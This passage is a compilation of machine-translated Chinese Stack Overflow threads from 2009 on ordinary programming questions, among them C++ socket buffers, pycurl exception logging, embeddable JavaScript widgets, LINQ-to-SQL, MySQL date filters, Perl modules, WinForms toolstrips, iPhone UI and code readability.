请注意，这可能不是读取字符串的最佳方式。
我会通过流传递长度信息，这样你就知道什么时候没有更多信息可以读取，然后只读取所需的信息。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2009-02-15T17:02:14.647

**见评论：** 我的立场是正确的。我被告知了。但是，我仍然认为依靠这样的内部结构是疯狂的。我使用的最后一个 microsoft 编译器违反了 C99 标准，这让我悲痛欲绝。如果他们不能在*vsnprinf()*或*new 上获得正确的返回值，*你真的要依赖这样的勘误表吗？

~~您正在对向量的实现方式做出假设。您假设 v[1] 紧跟在内存中的 v[0] 之后。~~

**char buf[];**之间有区别 **& buf[1] == & buf[0] + 1** 和 **向量 v; & v[1] == & v[0] + 1**。char 数组使用指针算法。向量使用运算符 []。向量如何在内部存储数据，无论是否相邻，都取决于该向量类。

~~虽然您的代码可能仍然有效，但这仍然是一件**坏事**！它使您的软件变得脆弱，导致它在您最不期望的时候以奇怪和预期的方式崩溃！~~

这是本地堆栈上临时 char 数组的理想情况。尺寸很小。您有一个硬编码的最大尺寸。

如果大小不是恒定的，我仍然会在堆栈上使用一个小的本地字符数组缓冲区。我只是在每次迭代后将它附加到 C++ std::string 中。（是的，std::strings 可以存储包含多个空字符的二进制值。）

**recv()**返回它读取的字节数。Vector **v**不会自动拾取它。因此，您需要存储和使用该值。

我建议：

```
#define BUFFER_SIZE  (1024*16)
#define FLAGS        0

int  received = 0;
int  total    = 0;
char buffer [ BUFFER_SIZE + 1 ];

memset( buffer, 0, BUFFER_SIZE + 1 );

received = recv( sockfd, buffer, BUFFER_SIZE, FLAGS );

if ( received > 0 )
{
  copy( buffer + total,
        buffer + total + received,
        ostream_iterator<char>(cout) );

  total += received;
}

while( (received > 0) && (total < BUFFER_SIZE) )
{
  received = recv( sockfd, buffer + total, BUFFER_SIZE - total, FLAGS );

  if ( received > 0 )
  {
    copy( buffer + total,
          buffer + total + received,
          ostream_iterator<char>(cout) );

    total += received;
  }
}

buffer [ total ] = '\0';
buffer [ BUFFER_SIZE ] = '\0';

cout << "The total size is " << total << endl; 
```

# python - python运行时错误，可以转储文件吗？

> ID：550804
> 
> 赞同：2
> 
> 时间：2009-02-15T12:29:46.130
> 
> 标签：python, error-handling, pycurl

我正在使用 libcurl 对网页进行 DL，然后我正在扫描它以获取数据并使用其中一个链接做一些事情。但是，有时页面与 i 不同，因此我提取了错误数据并且 pycurl 抛出异常。我尝试找到 pycurl 的异常名称，但没有运气。

有没有办法我可以让回溯来执行一个函数，这样我就可以转储文件，这样我就可以查看文件输入并查看我的代码是否出错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T12:45:56.043

[sys.excepthook](http://docs.python.org/library/sys.html#sys.excepthook)在这里可以帮助您，您可以在其中设置全局异常处理程序。我不确定如何处理 pycurl 异常，它是一个绑定库，但它可能会重新分配给通用函数。就像是：

```
>>> import sys
>>> 
>>> def my_global_exception_handler(type, value, traceback):
...     print traceback
...     sys.exit()
... 
>>> sys.excepthook = my_global_exception_handler
>>> raise
<traceback object at 0xb7cfcaa4> 
```

这个异常钩子函数很容易成为一个实例方法，它可以访问需要转储的文件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T19:37:05.087

您可以使用通用异常处理程序。

```
logging.basicConfig( file="someFile.log", level=logging.DEBUG )
logger= logging.getLogger( __name__ )
try:
    curl = pycurl.Curl()
    curl.setopt(pycurl.URL, url)
    # etc.
    curl.perform()
    curl.close
    logger.info( "Read %s", url )
except Exception, e:
    logger.exception( e )
    print e, repr(e), e.message, e.args
    raise
logging.shutdown() 
```

这将编写一个很好的日志，其中包含您正在寻找的异常信息。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T12:40:18.163

您能否在主块中的某处捕获所有异常并使用 sys.exc_info() 获取回调信息并将其记录到您的文件中。exc_info() 不仅返回异常类型，而且还调用回溯，因此应该知道出了什么问题。

# javascript - 允许我网站的消费者将动态数据合并到他们的网站的最佳技术

> ID：550807
> 
> 赞同：2
> 
> 时间：2009-02-15T12:31:36.857
> 
> 标签：javascript

我要问的是，将我在我的网站上提供的数据消费/集成到他们自己的网站中的最佳方式是什么（即对于新手 Web 开发人员来说最简单的方式）。

我有一个用 asp.net/sql 服务器后端编写的网站。

我有客户希望能够将数据选择（例如数据表和一些长度不同且对每个用户不同的图像）合并到他们的网站中，以便数据看起来属于他们, 并由他们标记（理想情况下，数据将以默认的 css 格式提供给他们，但他们可以根据需要进行自定义）。当我网站上的数据发生变化时，他们网站上的数据也需要发生变化。

我希望我的数据用户访问我的网站，登录，然后能够从我的网站“复制”自定义脚本/代码，将其粘贴到他们的网站中，然后让它工作，无论他们的网站是什么是用（即纯 html、php、asp.net 或其他）编写的。

我假设某种 javascript 脚本将是最好的方法，但我不知道如何让用户完全简单以及脚本可能包含的内容（javascript 还不是我的强项） . 即，我可以在客户网站上获取 javascript，在我的服务器上调用 asp.net 脚本，然后将 HTML 流式传输回他们的网站。

我敢肯定在其他地方必须有这样的例子，有人能指出我正确的方向吗？

**编辑：让我试着举一个更好的例子来说明我正在尝试做的事情**。

我的应用程序不是房地产应用程序，但让我们假设它（假设 realtor.com 是 MLS 数据库）。现在这个国家的每个房地产经纪人都有自己的网站，而且它们是用各种语言编写的，所以我不能假设数据的消费者，我也不能假设他们有任何编程专业知识。

如果我是 realtor.com 的所有者，我希望每个房地产经纪人都能够访问我的网站，复制一段代码（就像我说的，也许是一些 javascript，但我不确定），回到他们的网站并粘贴将其放入他们页面的源代码中，然后当他们的一个用户访问“Joesrealty.com”并单击“显示所有待售物业”时，脚本/代码/页面实际上会通过在我的网站 (realtor.com) 并检索该代理出售的所有房产的列表（例如附有图片的表格）。

我知道我在一个知名网站的某个地方看到了一个很好的实现，但是我这辈子不记得我在哪里看到它，并且当时从不费心去尝试看看他们使用了什么技术。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T13:11:21.973

> 我有客户希望能够将数据选择（...）合并到他们的网站中，以便数据看起来属于他们，并由他们标记

许多网站通过 javascript 代码片段提供此功能，例如[TechnicalJobs.ie](http://technicaljobs.ie/widgets/)。

用户将一些 javascript 代码粘贴到他们的页面中。此代码回调您的网站以提取最新数据，然后将其显示在客户的网站上。

**例子**

我们可以发回一个未设置样式的新小部件列表，并允许用户设置 CSS 样式以调整其网站上的显示。

在您的页面上，告诉用户将以下 javascript 复制到他们的页面中：

```
<script src="http://www.yoursite.com/widgets.asp?action=getNewWidgets"
   type="text/javascript"></script>

<script type="text/javascript">
   showWidgets('widget-container', 'widget-list');
</script> 
```

在您的站点上，`widgets.asp`将负责从您的数据库中查找有关新小部件的数据。它将数据拉到一起，然后以[JSON 编码](http://json.org/)格式输出。逻辑全部用 ASP 或您选择的语言处理，并以下面概述的格式输出。此页面还将返回`showWidgets`处理转换数据以在用户网站上显示的方法。

`widgets.asp`的最终输出应类似于：

```
// Widget product data 
var widgets = [
     {
       "url":"http:\/\/www.yoursite.com\/widgets\/foo-widget",
       "title":"Brand new Foo Widget, available now!"
     },
     {
       // More widget details..
     }
];

// Function to display list of widgets on calling page    
function showWidgets(container_div, style)
{
    // Start building the html for the list
    var html = "<ul class='" + style + "'>";

    // Loop through all of the widgets we have, ading to list
    for (i = 0; i < widgets.length; i++)
    {
        html += "<li><a target='_blank' href='" + widgets[i].url + "'>";
        html += widgets[i].title;
        html += "</a></li>";
    }
    html += "</ul>";

    // We have the html, now write to the container     
    // If the user hasn't created this already, we'll make it      
    if (document.getElementById(container_div))
    {
        document.getElementById(container_div).innerHTML = html;    
    }
    else
    {
        // Target div wasn't made by user, create it inline
        document.write("<div id='" + container_div + "'>");
        document.write(html);
        document.write("</div>");
    }
} 
```

一旦用户将你的 js 代码嵌入到他们的页面中，输出`widgets.asp`将负责写出最近的数据。您可以指定样式等，或者将这一切留给最终用户根据他们网站的其余部分设置样式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T12:38:51.067

您的要求列表似乎非常广泛。

我打算建议构建某种 RESTful Web 服务，用户可以通过它以最合适的格式使用您的数据。这可能是 XML 或 JSON，如果他们有能力解析它，或者如果他们只想在他们的页面中嵌入一个 iframe，它可以返回纯 HTML。

看看雅虎的一些网络服务，了解它们是如何做事的：

[http://developer.yahoo.com/](http://developer.yahoo.com/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T13:11:11.427

任何类型的 Web 服务都需要在消费者端进行编程，所以这不是您的选择。您尝试做的通常是使用 Javascript 完成的。看看亚马逊为联营网站、Technorati 提供的服务……还有很多其他的例子。

它的工作方式 - 您的客户端包含来自您网站的 javascript 文件，该文件随后将作为浏览器中页面呈现的一部分执行，您可以将您的内容包含到生成的输出流中。重要的是要了解您必须为脚本服务。由于潜在的安全风险，浏览器会阻止跨站点脚本。例如，为了包含亚马逊的搜索小部件，您只需将以下代码放入您的页面（为了清楚起见，我删除了查询字符串参数）：

```
<SCRIPT charset="utf-8" type="text/javascript" 
        src="http://ws.amazon.com/widgets/q?...">
</SCRIPT> 
<NOSCRIPT>
<A HREF="http://ws.amazon.com/widgets/q?...">
        Amazon.com Widgets</A>
</NOSCRIPT> 
```

如果浏览器没有启用 Java 脚本，它只会显示一个链接。您可以将 DIV 标签包裹在它周围以控制小部件的大小。您唯一的其他选择是`<IFRAME>`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T12:40:02.097

您可以公开他们可以调用的 Web 服务。在 asp.net 中创建 Web 服务非常简单。

您可以为要公开的不同数据元素创建方法，并且客户可以使用您在方法中提供的任何参数调用服务，以便他们根据需要进一步过滤数据。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T13:19:48.270

创建一个可以基于参数或 content-accept-header 生成不同格式响应的 URL；我推荐 HTML、XML 和 JSON。HTML 用于想要使用 IFRAME 或拥有 Javascript 的客户端执行 document.write，XML 和 JSON 用于想要在输出数据之前处理数据的客户端，无论是使用客户端 Javascript 还是使用他们使用的任何语言的服务器端。您可以为您的客户创建一个 Javascript 以使用它来获取 HTML 并执行 document.write 以及包含一些默认 css。

# .net - 将 LINQ 转换为 sql 语句

> ID：550826
> 
> 赞同：12
> 
> 时间：2009-02-15T12:49:02.103
> 
> 标签：.net, linq, linq-to-sql

我想将 LINQ 表达式树转换为 SQL 语句，我不想​​为此编写自己的代码。

例子：

```
var query = from c in Customers
where c.Country == "UK" &&
      c.City == "London"
select c); 
```

到

```
SELECT ... FROM Customers AS c WHERE c.Country = "UK" AND c.City = "London" 
```

我知道`DataContext.Log`，但我想使用：

```
query.ToSqlStatementString() 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-02-15T16:24:10.823

```
CustomDataContext dc = new CustomDataContext();
IQueryable<Customer> query =
  from c in dc.Customer
  where c.Country == "UK"
  select c;
//
string command = dc.GetCommand(query).CommandText; 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2010-06-10T14:09:05.990

艾米 B 的回答可以满足您的需求，但需要数据库连接存在隐性成本。这样做的原因是通过询问服务器本身来确定 SQL 服务器版本。为避免这种情况，您应该使用以下代码片段：

```
/// <summary>
/// Through reflection (HACK) this sets the MS impl of LINQ-to-SQL to not attempt connection to the database just
/// to determine the SQL server version running to tailor the SQL query to.
/// </summary>
private static void hack_SetLINQ2SQLProviderMode(CustomDataContext db)
{
    object provider = hack_GetLINQ2SQLProvider(db);

    provider
        .GetType()
        .GetField("mode", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)
        .SetValue(provider, 2);
}

private static object hack_GetLINQ2SQLProvider(CustomDataContext db)
{
    return db
        .GetType()
        .GetProperty("Provider", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)
        .GetValue(_db, new object[0]);
} 
```

调用你的派生类`hack_SetLINQ2SQLProviderMode(db)`在哪里。`db``DataContext`

这将设置`mode`MS 实现 LINQ-to-SQL 的 IQueryProvider 的字段，告诉它您的意思是为 MS SQL Server 2005 生成 SQL 代码，由`SetValue(provider, 2)`. 用于`1`MS SQL Server 2000 或`3`MS SQL Server 2008。

这意味着，由于`mode`设置了字段，实现不再需要打开与数据库的 SQL 连接，您现在可以完全脱机工作。

请注意，据我了解，这是使用完全信任反射。您应该只在您控制且完全信任您的程序集的环境中使用此方法。

# php - 防止 SQL 返回比 Given 更早的数据的最快方法

> ID：550828
> 
> 赞同：1
> 
> 时间：2009-02-15T12:50:22.977
> 
> 标签：php, sql, date, where

我有一个非常复杂的数据库，其中包含用于不同事物的不同表的负载，每个事物都有一个时间戳（YMD h:m:s 格式）

有没有办法可以将我的 SQL 查询限制为某个时间跨度的结果，例如一周前？

如果需要的话，我有一个函数可以将这些时间戳转换为 unix

```
sqlToUnix($date);
//returns $unixTime 
```

所以例如

```
mysql_query(SELECT id FROM entries WHERE entries.date >= $formattedDateString); 
```

谢谢！

提醒一下，数据库日期的格式为：2009-02-15 08:47:45

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T12:56:48.030

使用 BETWEEN 语句（自 MySQL 4.0 起）完全可以做到这一点：

```
mysql_query("SELECT id FROM entries WHERE entries.date BETWEEN 'Y-M-D h:m:s' AND 'Y-M-D h:m:s'"); 
```

此外，要计算当前日期前一周的时间戳，请查看[MySQL 在线文档](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T14:41:47.917

我自己是一个 MSSQL 用户，但是在网上查找我可以看到一些关于 MySQL 5.0 的有用信息...

[curdate()](http://dev.mysql.com/doc/refman/5.0/en/date-and-time-functions.html#function_curdate "curdate()")
[date_add()](http://dev.mysql.com/doc/refman/5.0/en/date-and-time-functions.html#function_date-add "日期添加（）")

有了这个，你应该能够创建一个 WHERE 子句，比如......

```
WHERE
   <field> >= date_add(curdate(), INTERVAL -7 DAY) 
```

如其他地方所述，如果字段是字符串，请使用[STR_TO_DATE()将其转换为日期](http://dev.mysql.com/doc/refman/5.0/en/date-and-time-functions.html#function_str-to-date "str_to_date()")

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T12:55:10.357

是的，就像您所写的那样，您可以对输出进行大于和小于限制。哪里有问题？

如果您的字段不是时间戳/日期时间字段而是字符串，请使用 MySQL 函数 STR_TO_DATE() ( [http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html) )

# perl - 如何创建 Perl 模块？

> ID：550831
> 
> 赞同：17
> 
> 时间：2009-02-15T12:53:07.603
> 
> 标签：perl, module

你如何为 Perl 编写一个模块？在 Python 中，您可以使用：

```
# module.py
def helloworld(name):
    print "Hello, %s" % name

# main.py
import module
module.helloworld("Jim") 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2009-02-15T12:56:20.683

一类：

```
# lib/Class.pm
package Class;
use Moose;

# define the class

1; 
```

导出函数的模块：

```
# lib/A/Module.pm
package A::Module;
use strict;
use warnings;
use Sub::Exporter -setup => {
    exports => [ qw/foo bar/ ],
};

sub foo { ... }
sub bar { ... }

1; 
```

使用这些的脚本：

```
# bin/script.pl
#!/usr/bin/env perl

use strict;
use warnings;

use FindBin qw($Bin);
use lib "$Bin/../lib";

use Class;
use A::Module qw(foo bar);

print Class->new;
print foo(), bar(); 
```

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2009-02-15T12:56:35.957

基本上，您创建一个名为 的文件`Yourmodulename.pm`，其内容是：

```
package Yourmodulename;

# Here are your definitions

1; # Important, every module should return a true value 
```

然后使用该模块的程序将如下所示：

```
#!/usr/bin/perl
use strict;            # These are good pragmas
use warnings;      

# Used modules
use Carp;              # A module that you'll probably find useful
use Yourmodulename;    # Your module 
```

您可能希望以分层（并且希望是合乎逻辑的）方式组织您的模块。为此，您创建一个目录树，例如：

你的/Module.pm
你的/Other/Module.pm

然后在你的程序中：

```
use Your::Module;
use Your::Other::Module; 
```

有更多工具可以从您的模块中导出函数和变量，您可以查看 Henning Koch 的[“Writing Serious Perl: The absolute minimum you need to know”](http://www.netalive.org/tinkering/serious-perl/)。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2009-02-15T13:54:45.753

Perl 中的 Python 示例的“精确”等效项如下所示：

```
# MyModule.pm
package MyModule;

sub helloworld { 
    my ( $name ) = @_;
    print "Hello, $name\n";
}

1;

# main.pl
use MyModule;
MyModule::helloworld( 'Jim' ); 
```

有关更多信息，请参阅[perlfunc](http://perldoc.perl.org/functions/package.html)文档中[的条目。`package`](http://perldoc.perl.org/functions/package.html)有关更多信息，请参阅[perlmod](http://perldoc.perl.org/perlmod.html)文档。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2009-02-15T21:04:10.730

[中级 Perl](http://oreilly.com/catalog/9780596102067/)的最后三分之一专门用于模块创建。

每当您想知道如何在 Perl 中做某事时，请查看 perltoc，Perl 文档的目录：

```
% perldoc perltoc 
```

核心 Perl 文档的几个部分可以帮助您：

*   [perlmod](http://perldoc.perl.org/perlmod.html)
*   [perlmodlib](http://perldoc.perl.org/perlmodlib.html)
*   [perlmodstyle](http://perldoc.perl.org/perlmodstyle.html)
*   [perlnewmod](http://perldoc.perl.org/perlnewmod.html)

*   [perltoot：Tom 的面向对象教程](http://perldoc.perl.org/perltoot.html)

*   [perlboot: Barnyard 面向对象教程](http://perldoc.perl.org/perlboot.html)

祝你好运，

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-02-15T14:20:49.903

到目前为止的答案还没有提到的一个小细节是，如果你有一个（最好是小）模块，它的目的足够明确以至于它永远不会被重用，你可以把它和主程序放在同一个文件中，或者另一个包：

```
# main.pl

# Since this is a beginner question, I'll also point out that you should
# *always* use strict and warnings.  It will save you many headaches.
use strict;
use warnings;

MyModule::helloworld('Jim');
AnotherModule::helloworld('Jim');

package MyModule; # Still in main.pl!

sub helloworld { 
    my ( $name ) = @_;
    print "Hello, $name\n";
}

package AnotherModule; # Yep, still main.pl

sub helloworld {
    my $name = shift;
    print "Another hello to $name\n";
} 
```

这不经常使用，因为它为您提供了一个在名称与包名称不同的文件中定义的包，这可能会让人感到困惑，因为您必须`use`/`require`文件名，但在代码中通过包名称引用它。

另请注意，`1;`仅需要作为通过`use`/包含的每个文件的最后一行`require`。在这种情况下，我不需要它，因为它在`main.pl`. 如果你把多个包放到同一个文件中，你只需要`1;`在文件末尾，而不是在每个包之后。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2009-02-18T04:31:31.633

最传统的模块设置方式如下：

```
package Foo::Bar;
our @ISA       = qw(Exporter);       # Tells perl what to do with...
our @EXPORT    = qw(sub1 sub2 sub3); # automatically exported subs
our @EXPORT_OK = qw(sub4 sub5);      # exported only when demanded

# code for subs, constants, package variables here

1;  # Doesn't actually have to be 1, just a 'true' value. 
```

正如其他人所说，您可以像这样使用它：

```
use Foo::Bar; 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-09-15T07:08:47.920

```
cpanm Module::Starter::PBP
perl -MModule::Starter::PBP=setup
module-starter --module=My::Module 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2011-10-04T07:28:22.737

h2xs -XA -n 我的::模块

h2xs 是 perl 的标准工具，旨在帮助构建链接模块，包括链接的 C 头文件/代码，但可用于构建纯 perl 模块的完整骨架（带有 -XA 标志），包括事物比如一个测试目录、一个 README 文件、一个 Makefile 和一个 Manifest。（一篇很好的文章在这里概述了细节：http: [//perltraining.com.au/tips/2005-09-26.html](http://perltraining.com.au/tips/2005-09-26.html)）

它有点老派，但值得一看，即使只是为了提醒你一切正确（测试、文档、版本号、export 和 export_ok 列表，所有容易忘记的东西......）

您最终会在“My”目录（来自“My::Module”）中得到一个“Module.pm”文件，如下所示：

```
package My::Module;

use 5.008008;
use strict;
use warnings;

require Exporter;

our @ISA = qw(Exporter);

# Items to export into callers namespace by default. Note: do not export
# names by default without a very good reason. Use EXPORT_OK instead.
# Do not simply export all your public functions/methods/constants.

# This allows declaration       use My::Module ':all';
# If you do not need this, moving things directly into @EXPORT or @EXPORT_OK
# will save memory.
our %EXPORT_TAGS = ( 'all' => [ qw(

) ] );

our @EXPORT_OK = ( @{ $EXPORT_TAGS{'all'} } );

our @EXPORT = qw(

);

our $VERSION = '0.01';

# Preloaded methods go here.

1;
__END__
# Below is stub documentation for your module. You'd better edit it!

=head1 NAME

My::Module - Perl extension for blah blah blah 
```

# .net - 带有弹出菜单的 ToolStripButton？

> ID：550832
> 
> 赞同：0
> 
> 时间：2009-02-15T12:54:17.177
> 
> 标签：.net, winforms, user-interface, contextmenu, toolstrip

我正在为类似绘画的程序做 GUI，用户将能够从 ToolStrip 中选择绘图工具。其中一些工具有变化，我希望用户能够通过弹出菜单选择一个。

任何熟悉 Photoshop 工具栏界面的人都知道我在追求什么：用户可以单击按钮并开始使用所选工具，或者从单击时出现的弹出菜单中选择一种工具，然后从那时起该按钮将代表该工具。Also, the button will have the Checked property set to True when that tool-family is selected.

我认为这可以通过 SplitButton 或 DropDownButton 来完成，但它们没有 Checked 属性供用户查看当前选择的工具。因此，我使用了 ToolStripButton 和单击时显示的 ContextMenuStrip。

问题在于，由于我将光标位置显示在 ContextMenuStrip 上，因此取决于单击 ToolStripButton 的哪个部分，弹出菜单可能会部分覆盖它，并且看起来很粗糙。如何获取 ToolStripButton 的屏幕坐标？还是有更好的（并且仍然相对简单）的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T16:47:07.727

我以前在应用程序中实现过这种功能。在 Photoshop 中，每个工具都有不同的图标（套索和多边形套索有不同的图标，画笔和铅笔有不同的图标）。因此，当使用工具条时，我使用拆分按钮。当用户从下拉列表中选择一个工具时，您将所选工具的图标应用于拆分按钮。

ToolStripItem 可以有背景图像。要显示所选项目，您可以简单地将背景图像设置为纯色半透明图像（即纯黑色，透明度为 25%）。

编辑：最好使用 SystemColors.Highlight 的半透明版本

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T15:25:30.997

你没有说你为 GUI 使用了什么技术。我猜是winforms或WPF。如果您有选择，WPF 可能是最好的长期选择，它不仅支持上下文菜单按钮，而且支持应用程序的绘画部分。

如果您使用的是 winforms，您是否考虑过向主按钮添加上下文菜单？

# cocoa-touch - 在 iPhone 上重新创建通话菜单

> ID：550845
> 
> 赞同：0
> 
> 时间：2009-02-15T13:10:55.670
> 
> 标签：cocoa-touch

我一直在浏览 iPhone 的 UI 目录，但似乎找不到我要找的东西。

本质上，我想要一个可定制版本的 iPhone 上的“通话中”菜单，这样我就可以使用自己的图标并调用自己的功能。

“通话中”菜单示例：

![通话菜单](https://i.stack.imgur.com/CqtCG.jpg)

UIAlertView 是我发现的最接近它的东西，但它离我想要的还有一段距离。一位朋友说有人编写了一个开源版本，但他不记得它在哪里。我看过但找不到。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T13:30:24.953

您将找不到使用标准 SDK 提供的控件来执行此操作的方法。

相反，您需要创建自己的自定义视图并在需要时显示它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T14:28:33.677

没有用于此的内置组件。UIAlertView 应该只有 HIG 文档中的文本和按钮。

您必须创建自己的视图并向其添加控件。SDK 中的**HeadsUpUI**示例展示了如何将自定义的类似菜单的视图显示为叠加层。

希望有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T14:39:50.450

如果你把它分解，这个问题并不是那么糟糕。

创建一个新的 UIViewController 子类来控制示例中的大按钮，例如**ButtonPadViewController**。

然后创建另一个新的 UIViewController 子类，它将处理一个按钮，比如**ButtonViewController**。每个 ButtonViewController 都会有一个 UIImageView。您可以让此视图加载按钮的图像。由于每个视图都是一个单独的按钮，因此您还可以轻松检测此视图上的任何触摸。你可以说，如果你接到一个 touchesEnded 调用，表明用户已经点击了这个特定的按钮。

现在回到您的 ButtonPadViewController，您可以创建 ButtonViewController 的六个实例并将它们的视图作为子视图添加到由 ButtonPadView 管理的视图中。

对于最后的润色，您的 ButtonPadViewController 的视图需要部分透明并具有圆角。Buttons 本身只需要绘制按钮文本和图标。

# c++ - 引用 STL 地图元素的值？

> ID：550859
> 
> 赞同：9
> 
> 时间：2009-02-15T13:22:43.647
> 
> 标签：c++, stl, map

是否可以将映射元素值的引用传递给函数并在那里修改它？

```
foo(string & s)
{
    s = "xyz";
}

map<int, string> m;
m[1] = "abc";
foo(m[1]); // <-- Is it ok? Will m[1] be "xyz" after this call? 
```

谢谢你。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-15T13:25:39.613

答案是肯定的。

（运算符 [] 返回一个[引用](http://www.cplusplus.com/reference/stl/map/operator[].html)）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T13:27:07.333

我们可以。
它也适用于`std::vectors`（因为看起来你正在使用数字键，你可以考虑使用它们）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T13:27:55.083

是的。

这与键入 m[1] = "xyz" 没有什么不同。一旦完成它，编译器会将它全部减少到大致相同的东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T16:25:22.130

**忠告：** 您可能希望将其作为指针而不是引用传递。我这样做是为了让不经意的读者更清楚它会被改变。

这一切都是为了与必须维护此代码的下一个人进行清晰的沟通。

但除此之外，是的，这是完全合法的代码！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-16T09:41:38.957

是的，这很好 - 正如每个人都已经说过的那样 - 而且，如果不是，您的编译器会告诉您。您可能想尝试一下；尝试将 "hello" 或 (42) 传递给 foo(string&) 以了解编译器给您的警告。

# language-agnostic - 提高代码可读性

> ID：550861
> 
> 赞同：24
> 
> 时间：2009-02-15T13:25:23.703
> 
> 标签：language-agnostic, documentation, readability

当涉及到代码文档时，通常认为代码应该*自我解释*，并且内联代码文档（不包括公共 API 文档）应该只解释元代码问题，例如解决方法、解释为什么选择特定实现等。

您如何使您的代码更具可读性和更多*解释性*？

* * *

**编辑：** 除了一般评论外，我还在寻找具体的提示。因此，如果您说“简短但有意义的变量名”，如果您也能得到一个有用的提示（例如“使用三字原则”），那就太好了。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2009-02-15T14:06:34.383

查看 Jeff Atwood 的[Code Smells](http://blog.codinghorror.com/code-smells/)博客文章。它几乎总结了它。当谈到可读性好的代码时，我将添加我的个人精神：

*   **一致性：**这适用于格式化、使用大括号、命名（变量、类、方法）和目录布局（如果你将源目录埋在 /css 下的某个地方，我会用砍刀追你）；
*   **大小：**如果一个函数不能以正常的字体大小在正常 IDE 的屏幕上完全显示，那么你需要一个很好的理由来说明为什么不这样做。当然，对于更长的函数，也有一些有效的案例，但这些案例远远超过了这些令人震惊的例子。根据需要进行分解以保持功能简单；
*   **明智地评论：**一些程序员倾向于使用评论来代替可读代码，或者只是为了评论而评论（就像`/* finished */`之前的评论一样`return true;`。说真的，有什么意义呢？大多数（好的）代码可以自我解释；
*   **永远不要在项目中剪切和粘贴：**将代码片段从一个项目转移到另一个项目是完全可以接受的（每个项目都是一个孤岛），但你**永远**不应该将一个项目中的重要代码段转移到项目中的其他点. 不可避免地会发生一个变化，而你让一些可怜的开发人员负责查看这两个或更多代码段，试图找出它们的不同之处（可以说更重要的是，为什么）；和
*   **避免重复代码：**如果您发现自己一遍又一遍地编写相同的语句序列（或非常相似的语句），请将其抽象或参数化。如果您看到非常相似的陈述，则倾向于略过它们，假设它们都是相同的（通常它们不会以某种重要的方式出现）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-15T13:30:21.367

*   一致的格式样式
*   善用留白
*   使用简短但有意义的名称
*   没有太多评论（正如你提到的），但是当我这样做时，评论代码的原因，如果适用，**为什么不****评论**（为什么不使用其他一些实现，特别是如果它看起来应该是显而易见的所以）。
*   在分析器告诉我代码缓慢或效率低之前，不要优化代码

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-15T13:30:59.680

使用好的变量和方法名称。将代码分解成有意义的片段以实现特定目的。保持你的类的凝聚力（它们一起工作）和解耦（类之间几乎没有依赖关系）。不要重复自己（干）。遵循 Bob 叔叔的[SOLID 原则](http://www.objectmentor.com/resources/articles/Principles_and_Patterns.pdf)（而不是法律，正如他所[指出的那样](http://blog.objectmentor.com/articles/2009/02/12/getting-a-solid-start)），以使代码变得更好。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-15T13:36:30.807

来自'uncle bob' 的书清洁代码通过动手示例为您提供了函数应该是什么样子的一个很好的概述。

一些重要的点：

*   小函数，类
*   好，有意义，名字，大小无关紧要，但应该完全符合需要
*   函数/变量之间的垂直间距应该很小（声明的东西尽可能接近首次使用的地方）
*   函数和类应该只做一件事和一件事

这本书还有很多小规则，我真的很推荐它。还可以获取 Code Complete 2。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-02-15T13:32:14.030

自记录代码是：

*   良好的命名约定
*   组件（类、功能等）之间的清晰设计和职责分离

但是请记住，即使是最自我记录的代码也只能记录那里的内容。永远不要故意遗漏、优化、尝试和丢弃的东西等。基本上，在源文件中，您总是需要英语，否则您必然会遗漏重要的警告和设计决策。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-02-15T14:20:04.430

我通常不会在代码内部发表评论，但是我完全不同意人们经常持有的观点，即一个人应该只编写可读的代码，然后你就不需要文档。

我认为**应该**记录的是**您的界面**。我的意思是在类和方法之上应该有注释。当然不是像 set 和 get 这样的简单方法。

